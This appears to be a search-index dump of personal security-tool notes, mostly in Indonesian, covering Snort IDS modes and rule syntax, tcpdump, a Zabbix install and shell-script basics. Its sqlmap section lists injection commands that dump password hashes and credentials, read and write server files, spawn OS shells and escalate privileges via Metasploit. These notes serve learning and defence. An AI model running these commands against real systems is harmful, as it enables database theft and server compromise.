sudo snort -c /etc/snort/snort.conf -A full sudo snort -c /etc/snort/snort.conf -A none menjalankan snort tanpa configuration file , akan membantu dalam menguji rules yang dibuat, meskipun memberikan performa yang kurang sudo snort -c /etc/snort/rules/local.rules -A console mode IPS diaktifkan dengan parameter -Q --daq afpacket perlu mengaktifkan modul Data Acquisition (DAQ) modul afpacket dengan -i eth0:eth1 . diperlukan 2 interface untuk bekerja sudo snort -c /etc/snort/snort.conf -q -Q --daq afpacket -i eth0:eth1 -A console PCAP Investigation \u00b6 snort disamping dapat melakukan sniffing , logging , detect/prevent threats , juga dapat membaca dan menginvestigasi file PCAP. snort akan membaca traffic dengan alert tergantung rule yang dipakai. membaca PCAP dengan snort tanpa parameter hanya akan membaca captured traffic, kita dapat menggunakan fitur snort untuk mengidentifikasi captured traffic. Parameter Description -r / --pcap-single= Read a single pcap --pcap-list=\"\" Read pcaps provided in command (space separated). --pcap-show Show pcap name on console during processing. sudo snort -c /etc/snort/snort.conf -q --pcap-list=\"icmp-test.pcap http2.pcap\" -A console -n 10 ... sudo snort -c /etc/snort/snort.conf -A full -l . -r mx-2.pcap ... sudo snort -c /etc/snort/snort.conf -A full -l . --pcap-list=\"mx-2.pcap mx-3.pcap\" Snort Rule \u00b6 https://tryhackme.com/room/snort Rule Header \u00b6 Action terdapat beberapa action yang umum digunakan: - alert: generate alert dan log packet - log: log packet - drop: block dan drop packet - reject: block packet, melakukan log, dan terminate sesi packet Protocol Snort2 hanya memiliki 4 rule protocols (IP, TCP, UDP and ICMP), tetapi dapat menggunakan nomor port. Direction \u00b6 menunjukkan trafik yang akan disnort, bagian kiri menunjukkan source, kanan menunjukkan destination -> source to destination <> bidirectional flow Rule Options \u00b6 terdapat 3 opsi utama dalam snort: General Rule Option : opsi fundamendal rule Payload Rule Option : opsi rule untuk investigasi data payload. berguna untuk mendeteksi spesifik payload Non-Payload Rule Option : opsi rule untuk data non-payload. berguna untuk identifikasi masalah network General Rule Option \u00b6 msg pesan yang ditampilkan ketika rule tertriger. biasanya message adalah ringkasan event yang one-liner sid adalah ID rule, dibagi menjadi 3: - <100: Reserved rule - 100 - 999,999: Rule came with the build - >=100,000,000: Rule yang dibuat user Rule ID yang dibuat user harus lebih dari >= 1,000,000. dan ID harus unique reference tiap rule dapat memiliki informasi tambahan / referensi, untuk mempermudah analis dalam menganalisis alert dan investigasi rev Hanya menunjukkan berapa kali rule telah direvisi, dan itu dilakukan manual oleh user Payload Detection Rule Options \u00b6 content data payload. semakin spesifik pattern yang dicari, semakin memakan waktu - ASCII mode alert tcp any any < > any 80 (msg: \"GET Request Found\"; content:\"GET\"; sid: 100001; rev:1;) - HEX mode alert tcp any any < > any 80 (msg: \"GET Request Found\"; content:\"|47 45 54|\"; sid: 100001; rev:1;) nocase disable case sensitivity fast_pattern memprioritaskan search content. biasanya digunakan untuk investigasi lebih jauh. opsi ini selalu case sensitive dan hanya dapat digunakan sekali tiap rule. opsi ini diperlukan ketika menggunakan multiple opsi \"content\" berikut contohnya, fast_pattern memerintahkan snort untuk menggunakan opsi content pertama (GET) untuk initial packet match alert tcp any any < > any 80 (msg: \"GET Request Found\"; content:\"GET\"; fast_pattern; content:\"www\"; sid:100001; rev:1;) Non-Payload Detection Rule Options \u00b6 id filter IP id alert tcp any any < > any any (msg: \"ID TEST\"; id:123456; sid: 100001; rev:1;) flags filter TCP flag - F - FIN - S - SYN - R - RST - P - PSH - A - ACK - U - URG alert tcp any any < > any any (msg: \"FLAG TEST\"; flags:S; sid: 100001; rev:1;) dsize filter ukuran packet payload - dsize:min < >max; - dsize:>100; - dsize:<100; alert ip any any < > any any (msg: \"SEQ TEST\"; dsize:100 < >300; sid: 100001; rev:1;) sameip filter source dan destination IP address untuk duplikasi alert ip any any < > any any (msg: \"SAME-IP TEST\"; sameip; sid: 100001; rev:1;) ketika membuat rule, maka akan tersimpan di \"/etc/snort/rules/local.rules\"","title":"Snort"},{"location":"tool/snort/#snort","text":"from tryhackme.com and manual snort","title":"Snort"},{"location":"tool/snort/#kemampuan-snort","text":"Live traffic analysis Attack and probe detection Packet logging Protocol analysis Real-time alerting Modules & plugins Pre-processors Cross-platform support! (Linux & Windows)","title":"Kemampuan Snort"},{"location":"tool/snort/#tiga-model-penggunaan-utama","text":"Mode Sniffer - Membaca paket IP dan memintanya di aplikasi konsol. Packet Logger Mode - Catat semua paket IP (masuk dan keluar) yang mengunjungi jaringan. Mode NIDS (Network Intrusion Detection System) dan NIPS (Network Intrusion Prevention System) - Log/drop paket yang dianggap berbahaya menurut aturan yang ditentukan pengguna.","title":"Tiga model penggunaan utama"},{"location":"tool/snort/#basic-syntax","text":"snort -V ,,_ -*> Snort! <*- o\" )~ Version 2.9.15.1 GRE (Build 15125) '''' By Martin Roesch & The Snort Team: http://www.snort.org/contact#team Copyright (C) 2014-2019 Cisco and/or its affiliates. All rights reserved. Copyright (C) 1998-2013 Sourcefire, Inc., et al. Using libpcap version 1.10.1 (with TPACKET_V3) Using PCRE version: 8.39 2016-06-14 Using ZLIB version: 1.2.11 USAGE: snort [-options] <filter options> Options: -A Set alert mode: fast, full, console, test or none (alert file alerts only) \"unsock\" enables UNIX socket logging (experimental). -b Log packets in tcpdump format (much faster!) -B <mask> Obfuscated IP addresses in alerts and packet dumps using CIDR mask -c <rules> Use Rules File <rules> -C Print out payloads with character data only (no hex) -d Dump the Application Layer -D Run Snort in background (daemon) mode -e Display the second layer header info -f Turn off fflush() calls after binary log writes -F <bpf> Read BPF filters from file <bpf> -g <gname> Run snort gid as <gname> group (or gid) after initialization -G <0xid> Log Identifier (to uniquely id events for multiple snorts) -h <hn> Set home network = <hn> (for use with -l or -B, does NOT change $HOME_NET in IDS mode) -H Make hash tables deterministic. -i <if> Listen on interface <if> -I Add Interface name to alert output -k <mode> Checksum mode (all,noip,notcp,noudp,noicmp,none) -K <mode> Logging mode (pcap[default],ascii,none) -l <ld> Log to directory <ld> -L <file> Log to this tcpdump file -M Log messages to syslog (not alerts) -m <umask> Set umask = <umask> -n <cnt> Exit after receiving <cnt> packets -N Turn off logging (alerts still work) -O Obfuscate the logged IP addresses -p Disable promiscuous mode sniffing -P <snap> Set explicit snaplen of packet (default: 1514) -q Quiet. Don't show banner and status report -Q Enable inline mode operation. -r <tf> Read and process tcpdump file <tf> -R <id> Include 'id' in snort_intf<id>.pid file name -s Log alert messages to syslog -S <n=v> Set rules file variable n equal to value v -t <dir> Chroots process to <dir> after initialization -T Test and report on the current Snort configuration -u <uname> Run snort uid as <uname> user (or uid) after initialization -U Use UTC for timestamps -v Be verbose -V Show version number -X Dump the raw packet data starting at the link layer -x Exit if Snort configuration problems occur -y Include year in timestamp in the alert and log files -Z <file> Set the performonitor preprocessor file path and name -? Show this information <Filter Options> are standard BPF options, as seen in TCPDump Longname options and their corresponding single char version --logid <0xid> Same as -G --perfmon-file <file> Same as -Z --pid-path <dir> Specify the directory for the Snort PID file --snaplen <snap> Same as -P --help Same as -? --version Same as -V --alert-before-pass Process alert, drop, sdrop, or reject before pass, default is pass before alert, drop,... --treat-drop-as-alert Converts drop, sdrop, and reject rules into alert rules during startup --treat-drop-as-ignore Use drop, sdrop, and reject rules to ignore session traffic when not inline. --process-all-events Process all queued events (drop, alert,...), default stops after 1st action group --enable-inline-test Enable Inline-Test Mode Operation --dynamic-engine-lib <file> Load a dynamic detection engine --dynamic-engine-lib-dir <path> Load all dynamic engines from directory --dynamic-detection-lib <file> Load a dynamic rules library --dynamic-detection-lib-dir <path> Load all dynamic rules libraries from directory --dump-dynamic-rules <path> Creates stub rule files of all loaded rules libraries --dynamic-preprocessor-lib <file> Load a dynamic preprocessor library --dynamic-preprocessor-lib-dir <path> Load all dynamic preprocessor libraries from directory --dynamic-output-lib <file> Load a dynamic output library --dynamic-output-lib-dir <path> Load all dynamic output libraries from directory --create-pidfile Create PID file, even when not in Daemon mode --nolock-pidfile Do not try to lock Snort PID file --no-interface-pidfile Do not include the interface name in Snort PID file --disable-attribute-reload-thread Do not create a thread to reload the attribute table --pcap-single <tf> Same as -r. --pcap-file <file> file that contains a list of pcaps to read - read mode is implied. --pcap-list \"<list>\" a space separated list of pcaps to read - read mode is implied. --pcap-dir <dir> a directory to recurse to look for pcaps - read mode is implied. --pcap-filter <filter> filter to apply when getting pcaps from file or directory. --pcap-no-filter reset to use no filter when getting pcaps from file or directory. --pcap-loop <count> this option will read the pcaps specified on command line continuously. for <count> times. A value of 0 will read until Snort is terminated. --pcap-reset if reading multiple pcaps, reset snort to post-configuration state before reading next pcap. --pcap-reload if reading multiple pcaps, reload snort config between pcaps. --pcap-show print a line saying what pcap is currently being read. --exit-check <count> Signal termination after <count> callbacks from DAQ_Acquire(), showing the time it takes from signaling until DAQ_Stop() is called. --conf-error-out Same as -x --enable-mpls-multicast Allow multicast MPLS --enable-mpls-overlapping-ip Handle overlapping IPs within MPLS clouds --max-mpls-labelchain-len Specify the max MPLS label chain --mpls-payload-type Specify the protocol (ipv4, ipv6, ethernet) that is encapsulated by MPLS --require-rule-sid Require that all snort rules have SID specified. --daq <type> Select packet acquisition module (default is pcap). --daq-mode <mode> Select the DAQ operating mode. --daq-var <name=value> Specify extra DAQ configuration variable. --daq-dir <dir> Tell snort where to find desired DAQ. --daq-list[=<dir>] List packet acquisition modules available in dir. Default is static modules only. --dirty-pig Don't flush packets and release memory on shutdown. --cs-dir <dir> Directory to use for control socket. --ha-peer Activate live high-availability state sharing with peer. --ha-out <file> Write high-availability events to this file. --ha-in <file> Read high-availability events from this file on startup (warm-start). --suppress-config-log Suppress configuration information output.","title":"Basic Syntax"},{"location":"tool/snort/#sniffer-mode","text":"sudo snort -c /etc/snort/snort.conf -T daemon mode sudo snort -c /etc/snort/snort.conf -D $ ps -ef | grep snort root 2898 1706 0 05:53 ? 00:00:00 snort -c /etc/snort/snort.conf -D $ sudo kill -9 2898 menampilkan header paket TCP/IP sudo snort -v menampilkan header paket IP dan TCP/UDP/ICMP pada interface tertentu sudo snort -v -i eth0 menampilkan paket data/payload sudo snort -d jika ingin menampilkan juga data link layer headers sudo snort -d -e menampilkan full detail paket dalam HEX sudo snort -X","title":"Sniffer Mode"},{"location":"tool/snort/#packet-logger-mode","text":"snort -dev -l . snort -dev -K ASCII -l . read binary log snort -r snort.log.1658551733 read menggunakan tcpdump tcpdump -r snort.log.1658551733 -ntc 10 membaca log dan filter sudo snort -r logname.log -X sudo snort -r logname.log icmp sudo snort -r logname.log tcp sudo snort -r logname.log 'udp and port 53' membaca 10 packet awal snort -dvr logname.log -n 10","title":"Packet Logger Mode"},{"location":"tool/snort/#idsips","text":"terdapat beberapa alert dalam snort console: menampilkan \" fast style \" alerts. cmg: menampilkan detail basic header dalam payload format hex dan text. full: Full alert mode , menampilkan semua informasi yang mungkin tentang alert . fast: mode fast alert . menampilkan alert dalam format sederhana. timestamp, alert message, source dan destination IPs/ports. none: Disabling alerting. sudo snort -c /etc/snort/snort.conf -A console sudo snort -c /etc/snort/snort.conf -A cmg sudo snort -c /etc/snort/snort.conf -A fast sudo snort -c /etc/snort/snort.conf -A full sudo snort -c /etc/snort/snort.conf -A none menjalankan snort tanpa configuration file , akan membantu dalam menguji rules yang dibuat, meskipun memberikan performa yang kurang sudo snort -c /etc/snort/rules/local.rules -A console mode IPS diaktifkan dengan parameter -Q --daq afpacket perlu mengaktifkan modul Data Acquisition (DAQ) modul afpacket dengan -i eth0:eth1 . diperlukan 2 interface untuk bekerja sudo snort -c /etc/snort/snort.conf -q -Q --daq afpacket -i eth0:eth1 -A console","title":"IDS/IPS"},{"location":"tool/snort/#pcap-investigation","text":"snort disamping dapat melakukan sniffing , logging , detect/prevent threats , juga dapat membaca dan menginvestigasi file PCAP. snort akan membaca traffic dengan alert tergantung rule yang dipakai. membaca PCAP dengan snort tanpa parameter hanya akan membaca captured traffic, kita dapat menggunakan fitur snort untuk mengidentifikasi captured traffic. Parameter Description -r / --pcap-single= Read a single pcap --pcap-list=\"\" Read pcaps provided in command (space separated). --pcap-show Show pcap name on console during processing. sudo snort -c /etc/snort/snort.conf -q --pcap-list=\"icmp-test.pcap http2.pcap\" -A console -n 10 ... sudo snort -c /etc/snort/snort.conf -A full -l . -r mx-2.pcap ... sudo snort -c /etc/snort/snort.conf -A full -l . --pcap-list=\"mx-2.pcap mx-3.pcap\"","title":"PCAP Investigation"},{"location":"tool/snort/#snort-rule","text":"https://tryhackme.com/room/snort","title":"Snort Rule"},{"location":"tool/snort/#rule-header","text":"Action terdapat beberapa action yang umum digunakan: - alert: generate alert dan log packet - log: log packet - drop: block dan drop packet - reject: block packet, melakukan log, dan terminate sesi packet Protocol Snort2 hanya memiliki 4 rule protocols (IP, TCP, UDP and ICMP), tetapi dapat menggunakan nomor port.","title":"Rule Header"},{"location":"tool/snort/#direction","text":"menunjukkan trafik yang akan disnort, bagian kiri menunjukkan source, kanan menunjukkan destination -> source to destination <> bidirectional flow","title":"Direction"},{"location":"tool/snort/#rule-options","text":"terdapat 3 opsi utama dalam snort: General Rule Option : opsi fundamendal rule Payload Rule Option : opsi rule untuk investigasi data payload. berguna untuk mendeteksi spesifik payload Non-Payload Rule Option : opsi rule untuk data non-payload. berguna untuk identifikasi masalah network","title":"Rule Options"},{"location":"tool/snort/#general-rule-option","text":"msg pesan yang ditampilkan ketika rule tertriger. biasanya message adalah ringkasan event yang one-liner sid adalah ID rule, dibagi menjadi 3: - <100: Reserved rule - 100 - 999,999: Rule came with the build - >=100,000,000: Rule yang dibuat user Rule ID yang dibuat user harus lebih dari >= 1,000,000. dan ID harus unique reference tiap rule dapat memiliki informasi tambahan / referensi, untuk mempermudah analis dalam menganalisis alert dan investigasi rev Hanya menunjukkan berapa kali rule telah direvisi, dan itu dilakukan manual oleh user","title":"General Rule Option"},{"location":"tool/snort/#payload-detection-rule-options","text":"content data payload. semakin spesifik pattern yang dicari, semakin memakan waktu - ASCII mode alert tcp any any < > any 80 (msg: \"GET Request Found\"; content:\"GET\"; sid: 100001; rev:1;) - HEX mode alert tcp any any < > any 80 (msg: \"GET Request Found\"; content:\"|47 45 54|\"; sid: 100001; rev:1;) nocase disable case sensitivity fast_pattern memprioritaskan search content. biasanya digunakan untuk investigasi lebih jauh. opsi ini selalu case sensitive dan hanya dapat digunakan sekali tiap rule. opsi ini diperlukan ketika menggunakan multiple opsi \"content\" berikut contohnya, fast_pattern memerintahkan snort untuk menggunakan opsi content pertama (GET) untuk initial packet match alert tcp any any < > any 80 (msg: \"GET Request Found\"; content:\"GET\"; fast_pattern; content:\"www\"; sid:100001; rev:1;)","title":"Payload Detection Rule Options"},{"location":"tool/snort/#non-payload-detection-rule-options","text":"id filter IP id alert tcp any any < > any any (msg: \"ID TEST\"; id:123456; sid: 100001; rev:1;) flags filter TCP flag - F - FIN - S - SYN - R - RST - P - PSH - A - ACK - U - URG alert tcp any any < > any any (msg: \"FLAG TEST\"; flags:S; sid: 100001; rev:1;) dsize filter ukuran packet payload - dsize:min < >max; - dsize:>100; - dsize:<100; alert ip any any < > any any (msg: \"SEQ TEST\"; dsize:100 < >300; sid: 100001; rev:1;) sameip filter source dan destination IP address untuk duplikasi alert ip any any < > any any (msg: \"SAME-IP TEST\"; sameip; sid: 100001; rev:1;) ketika membuat rule, maka akan tersimpan di \"/etc/snort/rules/local.rules\"","title":"Non-Payload Detection Rule Options"},{"location":"tool/sqlmap/","text":"sqlmap \u00b6 sumber : https://www.youtube.com/user/inquisb/videos demo 1 : \u00b6 Extensively fingerprint the back-end database management system, enumerate banner, session user, current database, users, users's password hashes, database sqlmap -u http://192.168.43.7/index.php?id=1 -f -b --current-user --current-db --users --password --dbs -v 0 -u : target url -f : extensively fingerprint the back-end DBMS -b : retrieve DBMS banner --current-user : retrieve session user --current-db : retrieve current database --users : enumerate database users --password : enumerate database users's password hashes --dbs : enumerate available databases -v : output verbosity level (0, warning) demo 2 : \u00b6 Retrieve the database management system banner and enumerate the password hashes for the database session user via UNION query SQL injection sqlmap -u \"\" -b --password -U CU --union-use -v 2 -U : specify the database user (CU, alias for current user) --union-use : retrieve data via UNION query SQL inject, if possible demo 3 : \u00b6 Dump only from the second to the third entry of column surname of table users sqlmap -u \"\" --dump -T users -C surname -D testdb --start 2 --stop 3 -v 2 --dump : dumb table entries -T : table to dump -C : columns to dump --start : first entry to dump --stop : last entry to dump demo 4 : \u00b6 Enumerate and dump entries of all databases' tables containing only one or more columns specified by the user sqlmap -u \"\" --dump -C 'user,pass' -v 1 --exclude-sysdbs --exclude-sysdbs : ignore system databases demo 5 : \u00b6 interactive SQL shell sqlmap -u \"\" --sql-shell -v 2 --sql-shell : spawn an interactive SQL shell demo 6 : \u00b6 sqlmap reads a file from the underlying file system and stores it locally sqlmap -u \"\" --read-file \"C:\\example.txt\" -v 2 --read-file : file to read from the underlying file system demo 7 : \u00b6 sqlmap uploads a file from the local file system to the database server underlying file system and checks afterward for consistency sqlmap -u \"\" --write-file /etc/passwd --dest-file /tmp/writetest -v 2 --write-file : file to upload to the underlying file system(/etc/passwd) --dest-file : absolute file system path to write to(/tmp/writetest) demo 8 : \u00b6 Operating system command execution via user-defined function injection sqlmap -u \"\" --os-cmd \"id\" -v 1 --os-cmd : operating system command to execute(id) demo 9 : \u00b6 Interactive shell where the user can execute operating system commands via user-defined function injection sqlmap -u \"\" --os-shell -v 1 --union-use --os-shell : spawn an inteactive command prompt demo 1 : \u00b6 sqlmap -u \"\" --os-pwn --msf-path /home/unquis/software/metasploit --priv-esc -v 1 --os-pwn : establish an out-of-band connection between the user and the database server --msf-path : metasploit file system path --priv-esc : try to elevate the database process user privileges to SYSTEM demo 1 : \u00b6 sqlmap -u \"\" --os-bof -v 1 --msf-path ~/software/metasploit --os-bof : establish an out-of-band connection between the user and the database server by exploiting microsoft sql server buffer overflow","title":"sqlmap"},{"location":"tool/sqlmap/#sqlmap","text":"sumber : https://www.youtube.com/user/inquisb/videos","title":"sqlmap"},{"location":"tool/sqlmap/#demo-1","text":"Extensively fingerprint the back-end database management system, enumerate banner, session user, current database, users, users's password hashes, database sqlmap -u http://192.168.43.7/index.php?id=1 -f -b --current-user --current-db --users --password --dbs -v 0 -u : target url -f : extensively fingerprint the back-end DBMS -b : retrieve DBMS banner --current-user : retrieve session user --current-db : retrieve current database --users : enumerate database users --password : enumerate database users's password hashes --dbs : enumerate available databases -v : output verbosity level (0, warning)","title":"demo 1 :"},{"location":"tool/sqlmap/#demo-2","text":"Retrieve the database management system banner and enumerate the password hashes for the database session user via UNION query SQL injection sqlmap -u \"\" -b --password -U CU --union-use -v 2 -U : specify the database user (CU, alias for current user) --union-use : retrieve data via UNION query SQL inject, if possible","title":"demo 2 :"},{"location":"tool/sqlmap/#demo-3","text":"Dump only from the second to the third entry of column surname of table users sqlmap -u \"\" --dump -T users -C surname -D testdb --start 2 --stop 3 -v 2 --dump : dumb table entries -T : table to dump -C : columns to dump --start : first entry to dump --stop : last entry to dump","title":"demo 3 :"},{"location":"tool/sqlmap/#demo-4","text":"Enumerate and dump entries of all databases' tables containing only one or more columns specified by the user sqlmap -u \"\" --dump -C 'user,pass' -v 1 --exclude-sysdbs --exclude-sysdbs : ignore system databases","title":"demo 4 :"},{"location":"tool/sqlmap/#demo-5","text":"interactive SQL shell sqlmap -u \"\" --sql-shell -v 2 --sql-shell : spawn an interactive SQL shell","title":"demo 5 :"},{"location":"tool/sqlmap/#demo-6","text":"sqlmap reads a file from the underlying file system and stores it locally sqlmap -u \"\" --read-file \"C:\\example.txt\" -v 2 --read-file : file to read from the underlying file system","title":"demo 6 :"},{"location":"tool/sqlmap/#demo-7","text":"sqlmap uploads a file from the local file system to the database server underlying file system and checks afterward for consistency sqlmap -u \"\" --write-file /etc/passwd --dest-file /tmp/writetest -v 2 --write-file : file to upload to the underlying file system(/etc/passwd) --dest-file : absolute file system path to write to(/tmp/writetest)","title":"demo 7 :"},{"location":"tool/sqlmap/#demo-8","text":"Operating system command execution via user-defined function injection sqlmap -u \"\" --os-cmd \"id\" -v 1 --os-cmd : operating system command to execute(id)","title":"demo 8 :"},{"location":"tool/sqlmap/#demo-9","text":"Interactive shell where the user can execute operating system commands via user-defined function injection sqlmap -u \"\" --os-shell -v 1 --union-use --os-shell : spawn an inteactive command prompt","title":"demo 9 :"},{"location":"tool/sqlmap/#demo-1_1","text":"sqlmap -u \"\" --os-pwn --msf-path /home/unquis/software/metasploit --priv-esc -v 1 --os-pwn : establish an out-of-band connection between the user and the database server --msf-path : metasploit file system path --priv-esc : try to elevate the database process user privileges to SYSTEM","title":"demo 1 :"},{"location":"tool/sqlmap/#demo-1_2","text":"sqlmap -u \"\" --os-bof -v 1 --msf-path ~/software/metasploit --os-bof : establish an out-of-band connection between the user and the database server by exploiting microsoft sql server buffer overflow","title":"demo 1 :"},{"location":"tool/tcpdump/","text":"sumber https://lms.onnocenter.or.id/wiki/index.php/Tcpdump Tcpdump \u00b6 apt-get install tcpdump Perintah yang menangkap packet, misalnya: tcpdump -i eth0 Perintah yang perlu dijalankan untuk menangkap paket IPv6 yang melalui eth5 adalah tcpdump -i eth5 -vv ip6 Untuk melakukan capture packet, dapat di jalankan perintah tcpdump -t -n -i eth0 -vv Untuk melakukan capture packet IPv6, dapat di jalankan perintah tcpdump -t -n -i eth0 -s 512 -vv ip6 or proto ipv6 Dimana: -s 512 : menaikan panjang snap saat menangkap paket 512 bytes -vv : output lebih verbose -n : jangan resolve address ke hostname. Ini terutama bermanfaat jika reverse DNS tidak berjalan baik. Tcpdump: capture paket dalam format pcap utk wireshark tcpdump -ni eth0 -s0 -w /var/tmp/capture.pcap tcpdump -i eth0 -s 0 -w ./dump.pcap dan lain-lain \ud83d\ude0b","title":"Tcpdump"},{"location":"tool/tcpdump/#tcpdump","text":"apt-get install tcpdump Perintah yang menangkap packet, misalnya: tcpdump -i eth0 Perintah yang perlu dijalankan untuk menangkap paket IPv6 yang melalui eth5 adalah tcpdump -i eth5 -vv ip6 Untuk melakukan capture packet, dapat di jalankan perintah tcpdump -t -n -i eth0 -vv Untuk melakukan capture packet IPv6, dapat di jalankan perintah tcpdump -t -n -i eth0 -s 512 -vv ip6 or proto ipv6 Dimana: -s 512 : menaikan panjang snap saat menangkap paket 512 bytes -vv : output lebih verbose -n : jangan resolve address ke hostname. Ini terutama bermanfaat jika reverse DNS tidak berjalan baik. Tcpdump: capture paket dalam format pcap utk wireshark tcpdump -ni eth0 -s0 -w /var/tmp/capture.pcap tcpdump -i eth0 -s 0 -w ./dump.pcap dan lain-lain \ud83d\ude0b","title":"Tcpdump"},{"location":"tool/zabbix/","text":"Zabbix \u00b6 June 9 th , 2022 Official documentation zabbix Debian installation wget https://repo.zabbix.com/zabbix/6.0/debian/pool/main/z/zabbix-release/zabbix-release_6.0-1+debian10_all.deb sudo dpkg -i zabbix-release_6.0-1+debian10_all.deb sudo apt update sudo apt install zabbix-server-mysql zabbix-frontend-php zabbix-apache-conf zabbix-sql-scripts zabbix-agent if your download above is having trouble, in my case I had trouble with some package which are not in the installation candidate, so first I need to download additional packages, in my case there are perl-modules-5.28 libperl5.28 libevent-2.1-6 libsnmp30 i will download for debian-amd64 wget http://ftp.us.debian.org/debian/pool/main/p/perl/perl-modules-5.28_5.28.1-6+deb10u1_all.deb sudo dpkg -i perl-modules-5.28_5.28.1-6+deb10u1_all.deb wget http://ftp.us.debian.org/debian/pool/main/p/perl/libperl5.28_5.28.1-6+deb10u1_amd64.deb sudo dpkg -i libperl5.28_5.28.1-6+deb10u1_amd64.deb wget http://kr.archive.ubuntu.com/ubuntu/pool/main/libe/libevent/libevent-2.1-6_2.1.8-stable-4build1_amd64.deb sudo dpkg -i libevent-2.1-6_2.1.8-stable-4build1_amd64.deb wget http://ftp.us.debian.org/debian/pool/main/n/net-snmp/libsnmp30_5.7.3+dfsg-5+deb10u2_amd64.deb sudo dpkg -i libsnmp30_5.7.3+dfsg-5+deb10u2_amd64.deb sudo apt install zabbix-server-mysql zabbix-frontend-php zabbix-apache-conf zabbix-sql-scripts zabbix-agent # mysql -uroot -p password mysql> create database zabbix character set utf8mb4 collate utf8mb4_bin; mysql> create user zabbix@localhost identified by 'password'; mysql> grant all privileges on zabbix.* to zabbix@localhost; mysql> quit; zcat /usr/share/doc/zabbix-sql-scripts/mysql/server.sql.gz | mysql -uzabbix -p zabbix sudo systemctl restart zabbix-server zabbix-agent apache2 sudo systemctl enable zabbix-server zabbix-agent apache2 http://localhost/zabbix you can edit php.ini if the requirement is fail ( /etc/php/<version>/php.ini ) after all, login as Admin : zabbix","title":"Zabbix"},{"location":"tool/zabbix/#zabbix","text":"June 9 th , 2022 Official documentation zabbix Debian installation wget https://repo.zabbix.com/zabbix/6.0/debian/pool/main/z/zabbix-release/zabbix-release_6.0-1+debian10_all.deb sudo dpkg -i zabbix-release_6.0-1+debian10_all.deb sudo apt update sudo apt install zabbix-server-mysql zabbix-frontend-php zabbix-apache-conf zabbix-sql-scripts zabbix-agent if your download above is having trouble, in my case I had trouble with some package which are not in the installation candidate, so first I need to download additional packages, in my case there are perl-modules-5.28 libperl5.28 libevent-2.1-6 libsnmp30 i will download for debian-amd64 wget http://ftp.us.debian.org/debian/pool/main/p/perl/perl-modules-5.28_5.28.1-6+deb10u1_all.deb sudo dpkg -i perl-modules-5.28_5.28.1-6+deb10u1_all.deb wget http://ftp.us.debian.org/debian/pool/main/p/perl/libperl5.28_5.28.1-6+deb10u1_amd64.deb sudo dpkg -i libperl5.28_5.28.1-6+deb10u1_amd64.deb wget http://kr.archive.ubuntu.com/ubuntu/pool/main/libe/libevent/libevent-2.1-6_2.1.8-stable-4build1_amd64.deb sudo dpkg -i libevent-2.1-6_2.1.8-stable-4build1_amd64.deb wget http://ftp.us.debian.org/debian/pool/main/n/net-snmp/libsnmp30_5.7.3+dfsg-5+deb10u2_amd64.deb sudo dpkg -i libsnmp30_5.7.3+dfsg-5+deb10u2_amd64.deb sudo apt install zabbix-server-mysql zabbix-frontend-php zabbix-apache-conf zabbix-sql-scripts zabbix-agent # mysql -uroot -p password mysql> create database zabbix character set utf8mb4 collate utf8mb4_bin; mysql> create user zabbix@localhost identified by 'password'; mysql> grant all privileges on zabbix.* to zabbix@localhost; mysql> quit; zcat /usr/share/doc/zabbix-sql-scripts/mysql/server.sql.gz | mysql -uzabbix -p zabbix sudo systemctl restart zabbix-server zabbix-agent apache2 sudo systemctl enable zabbix-server zabbix-agent apache2 http://localhost/zabbix you can edit php.ini if the requirement is fail ( /etc/php/<version>/php.ini ) after all, login as Admin : zabbix","title":"Zabbix"},{"location":"tool/shellscript/shell-Array/","text":"Shell Script Array \u00b6 array_name =( value1 ... valuen ) NAME [ 0 ]= \"Zara\" NAME [ 1 ]= \"Qadir\" NAME [ 2 ]= \"Mahnaz\" NAME [ 3 ]= \"Ayan\" NAME [ 4 ]= \"Daisy\" echo \"First Index: ${ NAME [0] } \" echo \"Second Index: ${ NAME [1] } \" echo \"First Method: ${ NAME [*] } \" echo \"Second Method: ${ NAME [@] } \"","title":"Array"},{"location":"tool/shellscript/shell-Array/#shell-script-array","text":"array_name =( value1 ... valuen ) NAME [ 0 ]= \"Zara\" NAME [ 1 ]= \"Qadir\" NAME [ 2 ]= \"Mahnaz\" NAME [ 3 ]= \"Ayan\" NAME [ 4 ]= \"Daisy\" echo \"First Index: ${ NAME [0] } \" echo \"Second Index: ${ NAME [1] } \" echo \"First Method: ${ NAME [*] } \" echo \"Second Method: ${ NAME [@] } \"","title":"Shell Script Array"},{"location":"tool/shellscript/shell-Operators/","text":"Operators \u00b6 Contoh \u00b6 val = ` expr 2 + 2 ` echo \"Total value : $val \" #!/bin/sh a = 10 b = 20 val = ` expr $a + $b ` echo \"a + b : $val \" val = ` expr $a - $b ` echo \"a - b : $val \" val = ` expr $a \\* $b ` echo \"a * b : $val \" val = ` expr $b / $a ` echo \"b / a : $val \" val = ` expr $b % $a ` echo \"b % a : $val \" if [ $a == $b ] then echo \"a is equal to b\" fi if [ $a ! = $b ] then echo \"a is not equal to b\" fi #!/bin/sh a = 10 b = 20 if [ $a -eq $b ] then echo \" $a -eq $b : a is equal to b\" else echo \" $a -eq $b : a is not equal to b\" fi if [ $a -ne $b ] then echo \" $a -ne $b : a is not equal to b\" else echo \" $a -ne $b : a is equal to b\" fi if [ $a -gt $b ] then echo \" $a -gt $b : a is greater than b\" else echo \" $a -gt $b : a is not greater than b\" fi if [ $a -lt $b ] then echo \" $a -lt $b : a is less than b\" else echo \" $a -lt $b : a is not less than b\" fi if [ $a -ge $b ] then echo \" $a -ge $b : a is greater or equal to b\" else echo \" $a -ge $b : a is not greater or equal to b\" fi if [ $a -le $b ] then echo \" $a -le $b : a is less or equal to b\" else echo \" $a -le $b : a is not less or equal to b\" fi #!/bin/sh a = 10 b = 20 if [ $a ! = $b ] then echo \" $a != $b : a is not equal to b\" else echo \" $a != $b : a is equal to b\" fi if [ $a -lt 100 -a $b -gt 15 ] then echo \" $a -lt 100 -a $b -gt 15 : returns true\" else echo \" $a -lt 100 -a $b -gt 15 : returns false\" fi if [ $a -lt 100 -o $b -gt 100 ] then echo \" $a -lt 100 -o $b -gt 100 : returns true\" else echo \" $a -lt 100 -o $b -gt 100 : returns false\" fi if [ $a -lt 5 -o $b -gt 100 ] then echo \" $a -lt 100 -o $b -gt 100 : returns true\" else echo \" $a -lt 100 -o $b -gt 100 : returns false\" fi #!/bin/sh a = \"abc\" b = \"efg\" if [ $a = $b ] then echo \" $a = $b : a is equal to b\" else echo \" $a = $b : a is not equal to b\" fi if [ $a ! = $b ] then echo \" $a != $b : a is not equal to b\" else echo \" $a != $b : a is equal to b\" fi if [ -z $a ] then echo \"-z $a : string length is zero\" else echo \"-z $a : string length is not zero\" fi if [ -n $a ] then echo 